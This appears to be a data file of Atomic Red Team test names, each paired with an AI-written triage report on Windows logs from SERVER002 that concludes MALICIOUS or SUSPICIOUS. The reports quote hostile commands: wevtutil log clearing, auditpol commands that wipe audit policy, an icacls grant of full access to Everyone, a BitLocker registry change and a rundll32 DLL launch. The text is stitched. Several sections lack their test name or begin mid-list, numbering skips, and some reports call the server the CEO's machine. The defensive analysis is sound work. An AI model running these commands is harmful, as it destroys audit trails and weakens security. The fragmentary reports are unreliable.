   - There are multiple instances of `wevtutil.exe` being executed with the `cl` (clear) command to clear logs such as Security, System, Windows PowerShell, and Sysmon. This activity is associated with the user `SERVER002\admin_test` from a high integrity context, which supports the hypothesis of logs being deliberately cleared.

3. **Usage of Administrative Privileges:**
   - **Special Privileges Assigned** (`EventID 4672`): The SYSTEM account was granted special privileges. While normal for system process operations, given the context of other events, this may be more concerning.
   - **Account Management**: Multiple `EventID 4798` entries suggest enumeration or management of user account group memberships, which in the context of other events can indicate privilege reconnaissance or lateral movement preparation.

4. **Suspicious Process Execution:**
   - The presence of `cmd.exe` executing with a command referencing a suspicious path (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam`) linked to `wmic.exe` implies execution of a script or tool, potentially from the Atomic Red Team, which is known for executing penetration testing techniques.

5. **Indicators of Potential Reconnaissance:**
   - The execution of commands such as `whoami` and `hostname` from a high integrity context by the same `admin_test` user can often be part of an attacker’s effort to enumerate the environment and assess granted permissions for further exploitation.

### Assessment and Resolution:

Given the combination of log clearing, suspicious process executions, and use of administrative privileges, the activities captured in these logs are classified as **MALICIOUS**. The patterns observed strongly indicate an effort to cover tracks, maintain persistence, and potentially escalate privileges or perform lateral movement.

### Recommended Actions:

1. **Immediate Containment:**
   - Disconnect the affected system ""Server002"" from the network to prevent further spread or exfiltration of data.

2. **Forensic Investigation:**
   - Preserve all forensic data for detailed analysis. This includes a memory dump and capturing disk images if feasible.
   - Analyze any additional logs or system changes around the time of the identified events for further insights into the attacker's techniques and objectives.

3. **Security Measures:**
   - Review and enhance access controls, especially around accounts like `admin_test`.
   - Implement alerts for log alteration events and unusual privilege assignments to detect similar activities in the future.
   - Schedule regular security training focusing on insider threat and account misuse.

4. **Communication and Coordination:**
   - Inform relevant stakeholders and commence an incident management process, complying with relevant legal and regulatory requirements.

By following these steps, the organization can mitigate current threats, uncover more about the scope of the attack, and strengthen its defenses against future incidents."
Invoke CHM with default Shortcut Command Execution,"## Analysis Summary

The provided logs contain various events from the Application, System, Security, Windows PowerShell, and Sysmon logs. After a detailed examination, the following observations have been made:

### Suspicious and Anomalous Behavior

1. **Clearing of Event Logs**:
   - The Security, System, and Windows PowerShell event logs have been cleared. This is evidenced by the `LogFileCleared` events with `EventID` 1102 in the Security log, and `EventID` 104 in the System log. The user responsible for this action is `admin_test` on `SERVER002`. 
   - Clearing event logs is generally considered suspicious, especially if conducted without a legitimate reason or outside of regular maintenance since it can be an indicator of an attempt to conceal potentially malicious activities.
   
2. **Wevtutil.exe Execution**:
   - Multiple executions of `wevtutil.exe` were recorded in the Sysmon logs (EventID 1, Process Image: wevtutil.exe).
   - The command-line arguments indicate the clearing of event log channels such as Microsoft-Windows-Sysmon/Operational, Application, System, and Security (`cl` flag indicates 'clear log').
   - This behavior is consistent with attempts to erase traces after suspicious activities.

3. **PowerShell Activity**:
   - The PowerShell logs show the execution of a script `Invoke-ATHCompiledHelp` which could imply a specific PowerShell script action, possibly malicious if the script is unfamiliar or unnecessary for normal operations.
   - Running PowerShell scripts can be legitimate, but if an unrecognized or unnecessary script is executed on an executive-level machine, it demands further scrutiny.

4. **Process Execution**:
   - Numerous process executions are logged by Sysmon with high IntegrityLevel, which indicates the processes ran with high privileges. Processes include PowerShell, conhost.exe, and wevtutil.exe.
   - There's also a notable execution of `whoami.exe` and `hostname.exe`, which are commonly used to gather information about the system and user identity.

### Indicators of Potential Compromise

- The combination of event log clearing, high-level PowerShell activity, and execution of system information utilities are classic indicators of post-exploitation activities where an attacker maintains persistence, escalates privileges, or prepares for further exploitation stages.

## Resolution

Based on the detailed analysis above, the logs indicate that the actions undertaken (like log clearing combined with specific PowerShell execution) are consistent with potentially malicious intentions.

**Final Assessment**: **MALICIOUS**

## Guidance

1. **Immediate Steps**:
   - **Isolate the affected machine (SERVER002)** from the network to prevent further spread or damage.
   - **Scope and Quarantine**: Compare the affected systems’ current state with known good baselines to identify all changes, unauthorized software/scripts, or open network connections.

   - Cooperate with legal or cyber forensic teams if deemed necessary."
MSXSL Bypass using remote files,"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior
1. **Clearing of Event Logs**: 
   - In the **Security** log, Event ID 1102 indicates that the ""Security"" log was cleared by a user `admin_test` with the SID `S-1-5-21-3962163828-2803415714-1403596700-1006`.
   - In the **System** log, Event ID 104 indicates similar activity by `admin_test` for multiple channels, including the ""System"" and ""Windows PowerShell"" logs.

2. **Privileged Process Execution**:
   - There are numerous instances of `wevtutil.exe` being used to clear various logs (Application, System, Security) under a high integrity level by `admin_test`.
   - Execution of `cmd.exe` alongside what appears to be a tool test or script file from the Atomic Red Team related to potential red teaming or penetration testing (`msxsl.exe` with a command referencing external URLs).
   
3. **Time Manipulation**:
   - Two events (Event ID 4616 in the **Security** log and Event ID 1 in the **System** log) show that the system time was changed multiple times, which is unusual and disruptive especially if logs are being cleared simultaneously.

4. **Usage of `whoami.exe`**:
   - The presence of `whoami.exe` to query user account information might indicate an attempt to validate current user privileges in the context of a script or manual reconnaissance.

#### Indicators of Malicious Activity
- The combination of clearing event logs and usage of `wevtutil.exe` for such purposes is a known tactic for attackers attempting to cover their tracks.
- The time change, coupled with log clearing activities, makes it difficult to correlate events accurately and is indicative of a potential attempt to impede forensic analysis.
- Execution of `msxsl.exe` with parameters associated with external resources suggests scripted execution which could be innocuous in a testing scenario, but within the context of cleared logs and time changes, it appears suspicious.
  
### Assessment and Resolution

Based on the analysis:
- **Resolution:** **MALICIOUS**

### Threats or Risks Identified
- **Persistent Adversary Presence**: The actions observed are characteristic of an advanced or internal threat actor seeking to obfuscate activities and hinder investigative efforts.
- **Potential Data Exfiltration or Tampering**: The usage of external payloads (as observed with `msxsl.exe`) may pose risks of data exfiltration or unauthorized data modification.
- **Compromise Indications**: Combination of log clearance, time alteration, and security tool utilization signal potential compromise.

### Guidance on How to Proceed
1. **Immediate Isolation**: Consider isolating the affected system (Server002) from the network to prevent further potential malicious activity or data exfiltration.
2. **In-Depth Forensic Analysis**: Conduct a forensic analysis on the isolated machine to recover artifacts not cleared and confirm the adversary’s presence.
3. **Review User Activities**: Investigate user `admin_test` activities and credentials for any signs of misuse or unauthorized access.
4. **Advanced Threat Detection**: Deploy advanced threat detection measures (e.g., monitored honeypots, endpoint detection tools) to uncover potentially hidden threats.
5. **Security Posture Strengthening**: Reinforce logging, monitoring, and incident response procedures to prevent recurrence and increase detection efficiency.

Considering the malicious activities identified, correcting and learning from this incident is critical for improving the security posture and resilience of your infrastructure against future threats."
Modify UseTPMPIN Registry entry,"### Analysis of Logs

Upon analyzing the provided logs, there are several key observations that stand out:

#### Suspicious Activities:
1. **Clearing of Logs**: 
   - There are events that explicitly indicate the clearing of various log files, particularly for the System and Security logs. Clearing of logs is a common tactic used by attackers to cover their tracks.
   - Example: 
     - Security Log (Event ID: 1102): This event indicates clearing of the Security log by `SERVER002\admin_test`.
     - System Log (Event ID: 104): Similar clearing for the System and PowerShell logs by the same user.

2. **Process Execution Patterns**:
   - **Frequent usage of `wevtutil.exe`**: This utility is typically used to manage event logs. The execution of this tool with commands like `wevtutil.exe cl <log name>` suggests log clearing or querying. The usage pattern and frequency raise suspicion especially given the context of log clearing.
   - **Registry Manipulation**: An event involving `cmd.exe` executing a command line to add a registry key using `reg.exe` is noted. This command alters BitLocker configuration (`UseTPMPIN`) which can indicate a potential attempt to either disable or alter security measures.
   - Example: 
     - Command: `""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f`

3. **Time Manipulation**:
   - Events show minor time changes (`Event ID: 4616`) made by processes running under the `NT AUTHORITY\LOCAL SERVICE`. Although the time change is minimal, frequent changes, especially without proper logging or documentation, may indicate an attempt to interfere with timestamp integrity.

#### Potential Indicators of Compromise:
- **The combination of log clearance, registry changes, and multiple executions of `wevtutil.exe`** are strong indicators of potentially malicious activity aiming to erase tracks and alter security configurations.

### Assessment and Conclusion:
Given the patterns observed:
- The clearing of critical logs (Security and System) is a significant red flag.
- The use of utilities and tools (`wevtutil.exe`, `cmd.exe`, `reg.exe`) in a manner consistent with activity often used in adversarial playbooks.
- Registry changes that may affect security configurations.

### Recommended Resolution:
**MALICIOUS**

### Guidance on How to Proceed:
1. **Isolation**: Immediately isolate the affected machine (Server002) to prevent potential spread of malicious activity.
2. **Forensic Analysis**: Conduct a thorough forensic analysis to retrieve any residual evidence of abnormal activity or other indicators of compromise not caught by the logs.
3. **Review Access Logs**: Check for any unauthorized access and determine how `admin_test` performed these actions (whether legitimate credential use or compromise).
4. **Impact Assessment**: Evaluate if any sensitive data was accessed or altered as a result of this activity.
5. **Mitigation Measures**: Implement tighter access controls and monitoring, ensure logs are backed up to an immutable storage, and consider enhanced logging to capture any future attempts at unauthorized log manipulation.
6. **Communication**: Notify relevant internal parties and potentially affected third parties depending on data breach policies.


By proceeding with these steps, there will be a comprehensive response to the threat and measures to mitigate future incidents."
Create ADS command prompt,"Based on the investigation of the provided Windows event logs, below is a detailed analysis highlighting any suspicious activity that stands out:

### Analysis:

1. **Frequent Log Clearing:**
    - Multiple events (EventID 104 in System log; EventID 1102 in Security log; Sysmon log entries with process wevtutil.exe) indicate that logs for different channels (System, Windows PowerShell, and Security) were cleared by the user `SERVER002\admin_test` using the command-line tool `wevtutil.exe`.
    - Frequent log clearing is typically considered suspicious behavior as it can be used to cover tracks during unauthorized activity.

2. **Time Manipulation:**
    - Events (EventID 4616 in Security log and EventID 1 in System log) show time changes executed by the service `svchost.exe`. Time manipulation is often used to obfuscate traces or circumvent time-based security mechanisms.

3. **Execution of Suspicious Command:**
    - A Sysmon event (EventID 1) indicates the execution of a command via `cmd.exe`, which involves echoing commands to a file with an alternate data stream (`T1564.004_has_ads_cmd.txt:adstest.txt`). This is an obscure technique often used to execute hidden or unauthorized activities.

4. **Use of Privilege:**
    - An event (EventID 4672 in Security log) shows that the user `admin_test` has elevated privileges, including SeDebugPrivilege, SeSecurityPrivilege, etc. Such privileges allow extensive control over the system, which could be exploited maliciously.

5. **Presence of Network Service Account Activities:**
    - The presence of processes such as `sppsvc.exe` running under `NT AUTHORITY\NETWORK SERVICE`, and typical system processes (`TiWorker.exe`, `TrustedInstaller.exe`) is expected. However, a comprehensive review is needed to ensure they weren't leveraged in exploitation.

### Assessment:

The combination of indicators such as frequent log clearing (indicating potential log tampering), time changes, and the execution of sophisticated command lines aligns with potential malicious behavior, often seen in post-compromise scenarios. The activities appear to have been conducted under privileged accounts which elevate the risk and warrant serious consideration.

### Resolution:

**MALICIOUS** - The collected evidence supports a high likelihood of malicious activity. The attempts to obfuscate actions through log clearing and the use of sophisticated command techniques strongly indicate compromise.

### Recommended Actions:

1. **Immediate Response:**
   - Contain the affected machine to prevent further propagation or damage.
   - Preserve all relevant logs and data for further forensic analysis.

2. **Further Investigation:**
   - Conduct a thorough review of the machine for any unauthorized access or changes.
   - Check other systems in the network for similar indicators of compromise.
   - Inspect the user account (`SERVER002\admin_test`) for unauthorized privileges or unusual activity patterns.

3. **Preventive Measures:**
   - Re-evaluate and enhance monitoring configurations to catch such anomalies sooner in the process.
   - Educate users about security hygiene and possible consequences of malicious insider threats.
   - Review and enforce least privilege policies to limit account capabilities to essential operations only."
Hidden Window-Conhost Execution,"### Detailed Analysis

Upon reviewing the provided logs, there are certain activities that stand out as suspicious and potentially malicious:

1. **Clearing of Event Logs**:
   - There are multiple entries indicating the clearing of logs in the `System`, `Windows PowerShell`, and `Security` channels at similar timestamps. This behavior is unusual and often indicative of an attempt to cover tracks after malicious activity. Entries in event logs (Event ID 104 for System and Windows PowerShell, Event ID 1102 for Security) indicate that the user `admin_test` cleared these logs, which is a common tactic used by attackers to hide their actions.

2. **PowerShell Execution**:
   - There is evidence of PowerShell being used to execute commands (`powershell.exe & {conhost.exe --headless calc.exe}`), which is unusual for standard operations. PowerShell can be a powerful tool for attackers when leveraged for execution of commands and bypassing security controls. The command to run `conhost.exe` with parameters to run `calc.exe` in a headless mode suggests an unusual use of Windows native utilities that may indicate an attempt to run commands obfuscated from the user interface.

3. **Execution of Built-in Utilities**:
   - Commands like `whoami.exe` and `hostname.exe` were executed, which could be leveraged by attackers for reconnaissance purposes to understand the environment they are in. Using programs like `wevtutil.exe` (seen in the logs) to clear logs further supports suspicious intent.

4. **Process Anomalies**:
   - The processes instantiated by PowerShell and the unusual chain of execution (including attempts to run `calc.exe` via a console host in a headless mode) imply non-standard usage likely triggered by a script or remote control tool.

5. **Potential Indicators of Lateral Movement**:
   - The presence of `wsmprovhost.exe` as a parent process for several activities may be part of Windows Management Instrumentation (WMI) processes being leveraged for remote or automated script execution.

### Assessment

Based on the identified suspicious log activities, the sequence and pattern of cleared event logs, atypical use of PowerShell, and launching of unnecessary and unrelated processes indicate potential malicious activity. These actions suggest an attempt to obfuscate and conduct unauthorized actions on the system.

**Resolution: MALICIOUS**

### Recommended Actions

1. **Immediate Isolation**: Isolate the machine from the network to prevent further potential breaches.
2. **Forensic Analysis**: Conduct a thorough forensic analysis of the machine to understand how access was gained, what actions were performed, and whether any other machines were compromised.
3. **Review Network Logs**: Check network traffic logs for any unusual activity originating from the CEO’s machine that might indicate data exfiltration or lateral movement.
4. **Update Detection Rules**: Implement more stringent monitoring of PowerShell usage and log clearing activities to trigger earlier detection in the future.
5. **User Training**: Reinforce awareness training around phishing and social engineering, which could be vectors for initial compromise.
6. **Patch and Backup Systems**: Ensure all systems are up to date with the latest security patches and that backups are current and secure.

These actions will help in mitigating any current threats, preparing for future incidents, and preserving the integrity of the network."
NetWire RAT Registry Key Creation,"### Analysis: 

The provided logs contain several events that merit closer analysis:

1. **Process Execution**:
   - `whoami.exe`: While typically benign, its repeated execution from an unusual directory could indicate reconnaissance or attempted privilege information gathering.
   - `wevtutil.exe`: This was executed multiple times with commands to clear event logs (e.g., for Sysmon, Application, and System). This behavior is highly suspicious as attackers often clear or tamper with logs to cover tracks.

2. **Registry Manipulation** (`reg.exe`):
   - The series of commands executed via `cmd.exe` involves adding entries to the Windows registry related to a program seemingly called ""NetWire."" This activity is suspicious, especially considering NetWire is a known RAT (Remote Administration Tool).
   - This sequence can be an indicator of persistence mechanism typically used in malware infections.

3. **Log Clearing**:
   - Security and System logs have been cleared (`EventID 1102` and `EventID 104`). This activity, especially when found in conjunction with suspicious registry changes and program executions, strongly suggests malicious intent.

4. **Timestamp Anomalies**:
   - The `Kernel-General` and `Time-Service` events indicate time changes, which might be an attempt to tamper log timestamps for obfuscation. This is another tactic sometimes used to confuse tracking timeline of activities.

5. **Service Activity**:
   - A `Service stopped` event for EdgeUpdate is logged, but it doesn't seem directly related to the suspicious activity, though it's noteworthy.

6. **System Event Audit**:
   - No specific anomalies were detected outside the context of potential obfuscation endeavors.

### Assessment:

Based on the activities captured in the logs, there are multiple indicators that suggest malicious activity:

- Use of `whoami.exe` in combination with `wevtutil.exe` to clear event logs.
- Registry modifications and potential persistence mechanisms linked to a known RAT.
- Attempts to manipulate system time.

### Recommended Resolution:

**MALICIOUS** - The combination of event log clearing, suspicious registry modifications pertaining to a known RAT, and other supporting activities strongly indicate malicious behavior involving potential compromise.

This course of action will help to ensure the security of the network environment and prevent future instances of similar threats."
Disable Microsoft Office Security Features,"### Detailed Analysis

After reviewing the provided event logs, I identified several suspicious activities and behavior patterns:

1. **Event Log Clearing:**
   - **Sysmon Log [Process Creation]:** 
     - Multiple invocations of `wevtutil.exe` are evident, typically used for managing event logs. The command lines used suggest the event logs were cleared: `""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""`, `""wevtutil.exe cl Application""`, `""wevtutil.exe cl System""`, `""wevtutil.exe cl Security""`, and `""wevtutil.exe cl \""Windows PowerShell\""""`.
   - **System Log [EventID 104]:** Confirms logs were cleared for System and Windows PowerShell channels by `admin_test`, showing a clear attempt at obfuscation for potential malicious actions.
   - **Security Log [EventID 1102]:** The security log clearing indicates log manipulation and suggests an attempted cover-up.

2. **Suspicious PowerShell Activity:**
   - **Sysmon Log [Process Creation]:** PowerShell is executed with commands to modify the registry related to Microsoft Office Excel security settings, ostensibly to modify security features for Excel.
   - **Windows PowerShell Log:** Shows evidence of PowerShell scripting designed to change registry entries in the Office suite, potentially for disabling security features. This aligns with common tactics to bypass security or execute malicious macro code.

3. **Process Integrity and Elevation Events:**
   - **Security Log [EventID 4672]:** Indicates privileged actions. The privileges listed include SeDebugPrivilege, potentially allowing the process to debug other processes and inject code.

4. **User Account and Session Information:**
   - The suspicious actions were performed by `admin_test` who has a high integrity level, suggesting administrative privileges, which could explain the ability to clear logs and modify registry settings.

### Assessment

There is clear evidence of potentially malicious behavior:

- **Log Clearing Activity:** The repeated clearing of event logs by an administrative user is a red flag, suggesting efforts to hide traces of activity.
- **PowerShell Usage for Registry Manipulation:** Indicates an attempt to modify security settings, possibly to prepare for a subsequent malicious action such as enabling execution of dangerous macros or scripts.
- **Privilege Escalation Indicators:** The presence of elevated privileges necessary for such actions suggests a breach of the security model or misuse of administratively privileged accounts.

### Threats and Risks Identified

- **Obfuscation and Persistence:** Such activities indicate an attempt to maintain persistence on the system without detection, potentially paving the way for further compromise or data exfiltration.
- **Security Bypass:** Modifications to the registry related to Excel could allow malicious macros to execute without user intervention, potentially enabling wider compromise.

### Guidance to Proceed

1. **Immediate Containment:**
   - Isolate the affected system to prevent lateral movement or further data leakage.
2. **Investigation and Remediation:**
   - Conduct a thorough forensic investigation to determine the extent of the breach and any data affected.

Malware Masquerading and Execution from Zip File,"After conducting a thorough review of the provided Windows event logs, I have noted the following significant findings:

1. **PowerShell Activity:**
   - There is evidence of PowerShell execution where the command `Expand-Archive` is used to extract a ZIP file located at `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\T1036.zip` into a downloads directory, followed by executing a batch file `README.cmd`.
   - The naming pattern and associated paths indicate the presence of Atomic Red Team activity, which is often used for testing security monitoring and defenses. This activity itself can be considered benign if it was intended for security testing. However, if it was not sanctioned, it could represent suspicious behavior.

2. **Log Clearing Events:**
   - Several instances of log clearing activities were detected via `wevtutil.exe`, specifically targeting logs including System, Application, and Security logs. An event (EventID: 1102) indicates that the Security log was cleared, which is particularly suspicious since this could be an attempt to erase traces of unauthorized or malicious actions.
   - The command used to clear logs suggests deliberate attempts to obfuscate actions on this system.

3. **Privilege Activity:**
   - The user `admin_test` is observed with a series of high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which can allow the user to perform potentially harmful or administrative-level activities on the system.
   - High-privileged access combined with log clearing suggests malicious intent or potentially risky insider activity.

4. **Edge Updates and Installer Execution:**
   - A number of events related to Microsoft Edge updates and installer processes are present but appear typical for system updates. However, these updates coincide closely with suspicious PowerShell activities and log clearances, potentially indicating the usage of legitimate software distribution mechanisms for malicious purposes, though this alone would not inherently denote malicious behavior.

5. **Suspicious Execution via `rundll32.exe`:**
   - Execution of `rundll32.exe` with a DLL in the user's downloads folder: `rundll32 2.dll, StartW`.
   - Using `rundll32.exe` in this manner can sometimes indicate attempts to execute malicious code, especially when combined with log cleansing and high privilege access. 

Based on these observations, the logs contain multiple red flags that align with practices frequently employed during malicious activities. Especially concerning is the combination of suspicious PowerShell execution with nefarious potential, log clearance to hide traces of actions, and processes running with elevated privileges potentially without authorization.

**Resolution: SUSPICIOUS**

**Guidance:**
- Further investigations should be conducted to confirm whether the Atomic Red Team activity was authorized and to ascertain the full scope of any potential threat.
- Analyze user `admin_test`'s recent activities, especially those aligning with the execution of processes and any remote or direct access to the machine.
- Review and evaluate security policies regarding PowerShell execution and script block logging.
- Ensure robust alerting and monitoring for similar future activities, particularly focusing on log clearance events and unusual use of privileged access.
- Verify the legitimacy of installed .dll files and executables, particularly within user-accessible directories."

   - Cleared channels include System, Security, and Windows PowerShell. Clearing logs can be a technique to cover tracks after malicious activity.

2. **Privilege Escalation and Important Privileges:**
   - `EventID: 4672` shows that the user `admin_test` has acquired a range of high privileges such as `SeSecurityPrivilege`, `SeDebugPrivilege`, `SeBackupPrivilege`, etc. These privileges can be misused for malicious intents, indicating potential privilege escalation activities.

3. **Time Change Events:**
   - `EventID: 4616` depicts suspicious changes to system time. Time changes may be used to alter timestamp-related records to evade detection.

4. **Suspicious Command Execution:**
   - The `cmd.exe` process was executed with the command `\""cmd.exe\"" /c auditpol /clear /y & auditpol /remove /allusers`, indicating an attempt to clear audit policies (`EventID: 1` in Sysmon log). This could be an attempt to disable auditing mechanisms.

5. **Process Execution:**
   - Frequent and rapid execution of utility commands such as `whoami.exe` and `hostname.exe` might suggest reconnaissance activities.

6. **Unusual Activity from `admin_test`:**
   - High-level integrity and frequent logon/logoff activities combined with the use of system utilities for potentially destructive actions (e.g., clearing logs, manipulating audit settings).

### Assessment of the Situation:
Based on the combination of clearing logs, altering system time, high-level privileges acquisition, and audit policy manipulations, these activities appear suspicious and suggest potential malicious behavior. These patterns of behavior are indicative of an intrusion with intent to obfuscate and perform unauthorized actions.

**Assessment:**

The simultaneous clearing of multiple event logs, especially by using `wevtutil.exe`, is a strong indicator of an attempt to remove traces, typically associated with malicious activity. This behavior followed by expected reconnaissance commands (` hostname.exe`, `whoami.exe`) under an admin context further raises suspicions.

**Resolution: SUSPICIOUS**

While there are strong indicators of potentially nefarious activity, specifically related to log clearing and subprocess executions, additional investigation is needed to confirm the intention and scope of these actions. This should include reviewing user activity, analyzing surrounding network traffic, inspecting the use and creation of virtual machines, and historical log activities for patterns related to ""admin_test"" and any lateral movements.

**Guidance:**
- Begin an incident response to contain and mitigate any identified risks.
- Conduct a comprehensive forensic review of the server.
- Verify the legitimacy of the ""admin_test"" account activity and investigate any related compromised credentials.
- Reinforce monitoring and alerting for log clearing activities and unauthorized use of admin-level operations across the network."
Activate Windows NoControlPanel Group Policy Feature,"Upon reviewing the provided logs, several key observations highlight potential suspicious behavior:

1. **Event Log Clearing**: Multiple logs (System, Security, Windows PowerShell) have been cleared by the user `admin_test`. Event ID 1102 in the Security log is a clear indicator of the Security log being cleared. This behavior is often associated with attempts to cover tracks after suspicious or malicious activities.

2. **Use of `wevtutil`**: The Sysmon logs show repeated executions of `wevtutil` by the user `admin_test`. This tool is commonly used for managing Windows Event Log settings, including clearing logs, which corresponds with the cleared logs.

3. **Registry Modification via Command Line**: The Sysmon logs reveal a command executed by `cmd.exe` to add a registry key under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` to disable the Control Panel (value `NoControlPanel`). Such modifications are indicative of attempts to restrict or control user configurations and are suspicious unless authorized for administrative purposes.

4. **Execution of System Utilities**: There are multiple entries for system utilities like `whoami.exe`, `hostname.exe`, and `conhost.exe`. While these can be benign, in the context of event log clearing and registry manipulation, they may suggest enumeration or an automated script running suspicious operations.

5. **Microsoft Edge Update Activities**: There are numerous logs related to Microsoft Edge Update processes. These can be part of standard update procedures. However, if these are unexpected or occur with the log clearing and registry changes, they warrant verification against normal update schedules.

**Assessment**: The combination of event log clearing, unauthorized registry modification, and the use of Windows system tools suggests suspicious activity. While these actions individually can be legitimate, the context and temporal correlation raise concerns of potential malicious intent, possibly indicating a compromised account or insider threat activity.

**Recommendation**: Immediately investigate the `admin_test` account for unauthorized access or suspicious behavior. Verify if the registry modification aligns with any legitimate policy changes. Review any related network activity or changes in endpoint configuration. Given this context, further analysis is necessary for confirmation.

     - Security log cleared (`EventID: 1102`)
     - System log cleared
     - PowerShell log actions occur in rapid succession.

2. **Registry Modifications via Command Prompt:**
   - The `cmd.exe` is observed executing a batch of registry modifications including `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled`. These modifications are significant as they adjust system policies which may impact security:
     - `LocalAccountTokenFilterPolicy` could relate to user account control settings.
     - `EnableLinkedConnections` is often used to modify network sharing policies.

3. **Use of Utility Tools:**
   - Use of `whoami.exe` and `hostname.exe` which while standard tools, their invocation in this context might be part of adversary reconnaissance efforts to gather information about the machine.

4. **Microsoft Edge Update Activities:**
   - A series of benign processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) are observed. These processes appear to be routine updates or installation activities.

5. **Time Change:**
   - System time change is observed; often linked with aligning attack timestamps with local time. However, the context provided doesn’t directly link this with the suspicious activities.

**Assessment:**

- The activity documented related to clearing event logs, modifying registry settings, and potential reconnaissance clearly suggests covert actions which fit patterns associated with malicious behavior.

- The clearing of logs (`Security`, `System`, and `PowerShell`) by an admin test user in such rapid succession without a legitimate explanation significantly amplifies the risk factor in this incident indicating an attempt to conceal malicious activities.

**Resolution: MALICIOUS**

**Threats/Risks Identified:**

- High risk of data integrity compromise due to system policies adjustment through registry tweaks.

cacls - Grant permission to specified user or group recursively,"Upon reviewing the provided logs, a few events stand out as potential indicators of suspicious or malicious activity:

1. **Event Log Clearing:**
   - Security Log (EventID: 1102), System Log (EventID: 104): The security and system logs have been cleared. This event is typically indicative of malicious intent, as attackers often clear logs to cover their tracks. The user ""admin_test"" on ""SERVER002"" cleared these logs, which is particularly concerning given the user account's admin-level access.

2. **Cmd.exe Execution:**
   - Sysmon logs detail multiple instances of `cmd.exe` being executed by the ""admin_test"" user. The command `cmd.exe /c IF EXIST %%temp%%\T1222.001_cacls ( EXIT 0 ) ELSE ( EXIT 1 )` appears twice, suggesting potential scripting or automation that might be employed in a broader malicious script.

3. **Icacls Usage:**
   - There's an event involving `cmd.exe` that utilizes `icacls` to modify permissions (`icacls.exe %%temp%%\T1222.001_cacls /grant Everyone:F`). Granting ""Everyone"" full access is often used to escalate privileges or ensure an attacker has access to needed resources, which is suspicious.

4. **Wevtutil Usage:**
   - The command-line utility `wevtutil.exe` is seen clearing event logs (`""wevtutil.exe"" cl <log_name>`). This behavior directly aligns with efforts to remove evidence of activity, which is a well-known tactic of stealthy attacks.

5. **Command Execution Consistency:**
   - There is consistent usage of command-line tools like `hostname.exe` and `whoami.exe`, which could be part of legitimate administrative scripts or indeed reconnaissance activities by an adversary.

**Assessment:**
- The combination of log clearing (anomaly), spawning multiple `cmd.exe` processes, using `icacls` to modify file permissions significantly, and the use of `wevtutil.exe` to clear specific log channels suggests actions consistent with malicious behavior. These are red flags as they imply efforts to cover tracks and escalate privileges.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Isolate the affected system ""SERVER002"" immediately to prevent further potential exfiltration or lateral movement within the network.
- Conduct a thorough forensic investigation on ""SERVER002"" to understand the extent of the compromise, including a full disk analysis and volatility memory forensic analysis.
- Review and reinforce log retention and alerting around log management operations (clear logs, stop logging, etc.).
- Monitor and restrict the use of administrative tools and privileges, specifically focusing on any anomalous usage of scripting tools and utilities like `wevtutil.exe` and `icacls.exe`.
- Reassess the security posture and implement enhanced monitoring using the EDR system to capture and alert on similar suspicious activities in the future.
- Notify relevant stakeholders, including incident response and legal teams, for potential remediation and recovery processes."

### 1. Security Event Log
- **Event ID 1102**: Indicates that the audit log was cleared, which is typically a suspicious activity. The logs were cleared by a user named `admin_test`, suggesting possible malicious intent to cover tracks.

### 2. Application Event Log
- The logs show normal operation for software protection and Edge updates. However, they don't provide enough information to indicate malicious activity directly.

### 3. Windows PowerShell Event Log
- **PowerShell Activity**: There's a significant number of PowerShell executions involving a script `InstallUtilTestHarness.ps1`. This script is related to the T1218.004 technique, which is used for defense evasion.
- The PowerShell command notes the usage of a test harness to explore a dumper-like or evasion-like action (""InstallUtil Uninstall method execution""), with logs indicating possible tampering or test execution failures.

### 4. System Event Log
- **Event ID 104**: The event logs for both the System and PowerShell channels have been cleared, which aligns with the clearing of audit logs found earlier in the Security Event Log. This further supports suspicious behavior often associated with malicious activity.

### 5. Sysmon Log
- **wevtutil.exe Execution**: Multiple entries show `wevtutil.exe` being used to clear logs (e.g., `wevtutil.exe"" cl Security`), corroborating efforts to conceal activities.
- **PowerShell and InstallUtil Executions**: Specific activities from `powershell.exe` and `InstallUtil.exe` further suggest use of T1218.004, which is a known defense evasion technique using the InstallUtil utility.
- **Numerous EdgeUpdate Executions**: These seem aligned with legitimate auto-updates, yet are irrelevant to the immediate scope of investigation aside from being routine and expected.

## Assessment and Resolution

### Assessment:
The logs show multiple instances of log clearance, execution of a known defense evasion technique through PowerShell and the InstallUtil utility, and activities conducted by an administrator-level user `admin_test` that suggest attempts to hide ongoing operations. This pattern of behavior is typically indicative of an attempt to avoid detection after unauthorized actions, which aligns with common tactics used in data breaches or unauthorized access.

### Resolution: 
**MALICIOUS**

### Guidance on How to Proceed:
1. **Containment**: Isolate the affected machine (Server002) from the network immediately to prevent further spread or data exfiltration.
2. **Errorless Backup**: Secure backup of all potentially relevant data prior to further forensics to safeguard against further loss.
3. **Forensic Investigation**: Conduct a detailed forensic analysis on the identified scripts and binaries such as the `InstallUtilTestHarness.ps1` and the suspicious DLLs.

7. **Root Cause Analysis**: Identify the initial access vector to protect against recurrence of similar malicious activities."
Register-CimProvider - Execute evil dll,"After carefully analyzing the logs for the CEO's machine, several concerning patterns and potential indicators of malicious activity have been identified:

1. **Event Logs Clearing**: The Security, System, Application, and Windows PowerShell event logs were cleared. This action is a strong indicator of potential malicious activity aiming to cover tracks. The event log clearing by the user `admin_test` using the `wevtutil.exe` is highly suspicious, given that `wevtutil.exe` is a tool used to manage and clear Windows event logs.

2. **Process Execution**: There are indications of processes being spawned with high integrity levels, including unusual executions:
   - `powershell.exe`, `cmd.exe`, and `wevtutil.exe` executed by the user `admin_test` close to the time the logs were cleared suggests someone with potentially administrator privileges executing typical tools used in post-exploitation activities.
   - The use of `wevtutil.exe` to clear log channels indicates an advanced attempt to hide activity.

3. **Atomic Red Team Simulation**: From the command executed on `cmd.exe`, there is a reference to ""AtomicRedTeam"" and potentially the use of a tactic `T1218` which aligns with execution techniques often tested in penetration testing or simulated activities, indicating scripted or automated malicious activities or security testing that was not debriefed.

